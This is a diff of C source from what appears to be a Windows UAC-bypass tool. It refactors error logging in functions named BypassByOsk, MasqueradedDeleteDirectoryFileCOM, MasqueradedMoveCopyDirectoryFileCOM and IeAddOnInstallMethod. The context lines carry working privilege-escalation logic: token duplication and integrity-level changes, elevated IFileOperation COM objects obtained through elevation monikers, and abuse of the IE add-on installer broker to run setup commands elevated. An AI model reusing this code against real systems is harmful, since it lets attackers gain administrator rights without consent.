@@ -101,7 +101,7 @@ BOOL BypassByOsk
 	sei.nShow = SW_HIDE;
 
 	if (!ShellExecuteExW(&sei)) {
-		LogError(L"CreateProcessW failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("ShellExecuteExW", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -109,18 +109,18 @@ BOOL BypassByOsk
 	CloseHandle(sei.hProcess);
 	hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, TRUE, dwPid);
 	if (hProc == NULL) {
-		LogError(L"OpenProcess failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("OpenProcess", GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
-		LogError(L"OpenProcessToken failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("OpenProcessToken", GetLastError());
 		goto CLEANUP;
 	}
 
 	RtlSecureZeroMemory(&sa, sizeof(sa));
 	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
-		LogError(L"DuplicateTokenEx failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("DuplicateTokenEx", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -128,7 +128,7 @@ BOOL BypassByOsk
 	ConvertStringSidToSidW(SDDL_ML_MEDIUM, &pSid);
 	TokenInfo.Label.Sid = pSid;
 	if (!SetTokenInformation(hDuplicatedToken, TokenIntegrityLevel, &TokenInfo, sizeof(TokenInfo))) {
-		LogError(L"SetTokenInformation failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("SetTokenInformation", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -139,7 +139,7 @@ BOOL BypassByOsk
 
 	hMem = GlobalAlloc(GMEM_MOVEABLE, (lstrlenA(lpCommandLine) + 1) * sizeof(WCHAR));
 	if (hMem == NULL) {
-		LogError(L"GlobalAlloc failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("GlobalAlloc", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -149,17 +149,17 @@ BOOL BypassByOsk
 	lpGlobalMem[lstrlenW(lpGlobalMem)] = L'\0';
 	GlobalUnlock(hMem);
 	if (!OpenClipboard(NULL)) {
-		LogError(L"OpenClipboard failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("OpenClipboard", GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!EmptyClipboard()) {
-		LogError(L"EmptyClipboard failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("EmptyClipboard", GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!SetClipboardData(CF_UNICODETEXT, hMem)) {
-		LogError(L"SetClipboardData failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("SetClipboardData", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -171,7 +171,7 @@ BOOL BypassByOsk
 	RtlSecureZeroMemory(&pi, sizeof(pi));
 	si.cb = sizeof(si);
 	if (!CreateProcessAsUserW(hDuplicatedToken, NULL, lpCscriptCommandLine, &sa, &sa, TRUE, 0, NULL, NULL, &si, &pi)) {
-		LogError(L"CreateProcessAsUserW failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("CreateProcessAsUserW", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -239,31 +239,31 @@ BOOL MasqueradedDeleteDirectoryFileCOM
 	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
 	hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IFileOperation, &pFileOperation);
 	if (FAILED(hResult)) {
-		LogError(L"CoGetObject failed at %s", __FUNCTIONW__);
+		LOG_ERROR("CoGetObject", hResult);
 		goto CLEANUP;
 	}
 
 	hResult = pFileOperation->lpVtbl->SetOperationFlags(pFileOperation, FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
 	if (FAILED(hResult)) {
-		LogError(L"SetOperationFlags failed at %s", __FUNCTIONW__);
+		LOG_ERROR("pFileOperation->SetOperationFlags", hResult);
 		goto CLEANUP;
 	}
 
 	hResult = SHCreateItemFromParsingName(lpFilePath, NULL, &IID_IShellItem, &pShellItem);
 	if (FAILED(hResult)) {
-		LogError(L"SHCreateItemFromParsingName failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("SHCreateItemFromParsingName", hResult);
 		goto CLEANUP;
 	}
 
 	hResult = pFileOperation->lpVtbl->DeleteItem(pFileOperation, pShellItem, NULL);
 	if (FAILED(hResult)) {
-		LogError(L"DeleteItem failed at %s", __FUNCTIONW__);
+		LOG_ERROR("pFileOperation->DeleteItem", hResult);
 		goto CLEANUP;
 	}
 
 	hResult = pFileOperation->lpVtbl->PerformOperations(pFileOperation);
 	if (FAILED(hResult)) {
-		LogError(L"PerformOperations failed at %s", __FUNCTIONW__);
+		LOG_ERROR("pFileOperation->PerformOperations", hResult);
 		goto CLEANUP;
 	}
 
@@ -307,43 +307,46 @@ BOOL MasqueradedMoveCopyDirectoryFileCOM
 	hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IFileOperation, &pFileOperation);
 	//hResult = CoCreateInstance(&CLSID_FileOperation, NULL, CLSCTX_ALL, &IID_IFileOperation , &pFileOperation);
 	if (FAILED(hResult)) {
-		LogError(L"CoGetObject failed at %s", __FUNCTIONW__);
+		LOG_ERROR("CoGetObject", hResult);
 		goto CLEANUP;
 	}
 
 	hResult = pFileOperation->lpVtbl->SetOperationFlags(pFileOperation, FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
 	if (FAILED(hResult)) {
-		LogError(L"SetOperationFlags failed at %s", __FUNCTIONW__);
+		LOG_ERROR("pFileOperation->SetOperationFlags", hResult);
 		goto CLEANUP;
 	}
 
 	hResult = SHCreateItemFromParsingName(lpSrcFileName, NULL, &IID_IShellItem, &pSrcItem);
 	if (FAILED(hResult)) {
-		LogError(L"SHCreateItemFromParsingName failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
+		LOG_ERROR("SHCreateItemFromParsingName", hResult);
 		goto CLEANUP;
 	}
 
 	hResult = SHCreateItemFromParsingName(lpDestPath, NULL, &IID_IShellItem, &pDestItem);
 	if (FAILED(hResult)) {
-		LogError(L"SHCreateItemFromParsingName failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
+		LOG_ERROR("SHCreateItemFromParsingName", hResult);
 		goto CLEANUP;
 	}
 
 	if (IsMove) {
 		hResult = pFileOperation->lpVtbl->MoveItem(pFileOperation, pSrcItem, pDestItem, NULL, NULL);
+		if (FAILED(hResult)) {
+			LOG_ERROR("pFileOperation->MoveItem", hResult);
+			goto CLEANUP;
+		}
 	}
 	else {
 		hResult = pFileOperation->lpVtbl->CopyItem(pFileOperation, pSrcItem, pDestItem, NULL, NULL);
-	}
-
-	if (FAILED(hResult)) {
-		LogError(L"DeleteItem failed at %s", __FUNCTIONW__);
-		goto CLEANUP;
+		if (FAILED(hResult)) {
+			LOG_ERROR("pFileOperation->CopyItem", hResult);
+			goto CLEANUP;
+		}
 	}
 
 	hResult = pFileOperation->lpVtbl->PerformOperations(pFileOperation);
 	if (FAILED(hResult)) {
-		LogError(L"PerformOperations failed at %s", __FUNCTIONW__);
+		LOG_ERROR("pFileOperation->PerformOperations", hResult);
 		goto CLEANUP;
 	}
 
@@ -475,7 +478,7 @@ BOOL IeAddOnInstallMethod
 	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 	hResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
 	if (FAILED(hResult)) {
-		LogError(L"CoInitializeSecurity failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
+		LOG_ERROR("CoInitializeSecurity", hResult);
 		goto CLEANUP;
 	}
 
@@ -484,28 +487,28 @@ BOOL IeAddOnInstallMethod
 	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
 	hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IEAxiAdminInstaller, &BrokerObject);
 	if (FAILED(hResult)) {
-		LogError(L"CoGetObject failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
+		LOG_ERROR("CoGetObject", hResult);
 		goto CLEANUP;
 	}
 
 	hResult = BrokerObject->lpVtbl->InitializeAdminInstaller(BrokerObject, NULL, 0, &AdminInstallerUuid);
 	if (FAILED(hResult)) {
-		LogError(L"InitializeAdminInstaller failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
+		LOG_ERROR("BrokerObject->InitializeAdminInstaller", hResult);
 		goto CLEANUP;
 	}
 
 	hResult = BrokerObject->lpVtbl->QueryInterface(BrokerObject, &IID_IEAxiInstaller2, &InstallBroker);
 	if (FAILED(hResult)) {
-		LogError(L"InitializeAdminInstaller failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
+		LOG_ERROR("BrokerObject->QueryInterface", hResult);
 		goto CLEANUP;
 	}
 
 	GetSystemDirectoryW(wszConsentPath, _countof(wszConsentPath));
 	lstrcatW(wszConsentPath, L"\\consent.exe");
 	FileToVerify = SysAllocString(wszConsentPath);
-	hResult = InstallBroker->lpVtbl->VerifyFile(InstallBroker, AdminInstallerUuid, INVALID_HANDLE_VALUE, FileToVerify, FileToVerify, NULL, WTD_UI_NONE, WTD_UICONTEXT_EXECUTE, &IID_IUnknown, &CacheItemFilePath, &cbDummy , &pDummy);
+	hResult = InstallBroker->lpVtbl->VerifyFile(InstallBroker, AdminInstallerUuid, INVALID_HANDLE_VALUE, FileToVerify, FileToVerify, NULL, WTD_UI_NONE, WTD_UICONTEXT_EXECUTE, &IID_IUnknown, &CacheItemFilePath, &cbDummy, &pDummy);
 	if (FAILED(hResult)) {
-		LogError(L"VerifyFile failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
+		LOG_ERROR("InstallBroker->VerifyFile", hResult);
 		goto CLEANUP;
 	}
 
@@ -533,7 +536,7 @@ BOOL IeAddOnInstallMethod
 	EmptyBstr = SysAllocString(L"");
 	hResult = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker, AdminInstallerUuid, NULL, CacheItemFilePath, EmptyBstr, WorkDir, EmptyBstr, 4, &hProc);
 	if (FAILED(hResult)) {
-		LogError(L"RunSetupCommand failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
+		LOG_ERROR("InstallBroker->RunSetupCommand", hResult);
 		goto CLEANUP;
 	}
 
